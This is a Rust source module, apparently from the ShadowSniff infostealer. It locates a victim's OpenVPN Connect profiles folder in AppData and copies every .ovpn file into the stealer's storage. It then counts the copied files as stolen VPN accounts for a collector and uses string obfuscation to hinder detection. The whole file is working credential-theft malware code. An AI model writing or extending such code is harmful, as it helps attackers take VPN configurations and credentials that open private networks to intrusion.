/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use collector::{Collector, Vpn};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, copy_content_with_filter};
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

pub(super) struct OpenVPN;

impl<C: Collector, F: FileSystem> Task<C, F> for OpenVPN {
    parent_name!("OpenVPN");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let profiles = Path::appdata() / s!("OpenVPN Connect") / s!("profiles");

        if !StorageFileSystem.is_exists(&profiles) {
            return;
        }

        if copy_content_with_filter(
            StorageFileSystem,
            &profiles,
            filesystem,
            parent,
            &profile_filter,
        )
        .is_ok()
        {
            let count = StorageFileSystem
                .list_files_filtered(profiles, &profile_filter)
                .map(|files| files.len())
                .unwrap_or(0);

            collector.get_vpn().increase_accounts_by(count);
        }
    }
}

fn profile_filter(path: &Path) -> bool {
    path.extension()
        .map(|ex| ex.contains(s!("ovpn")))
        .unwrap_or(false)
}
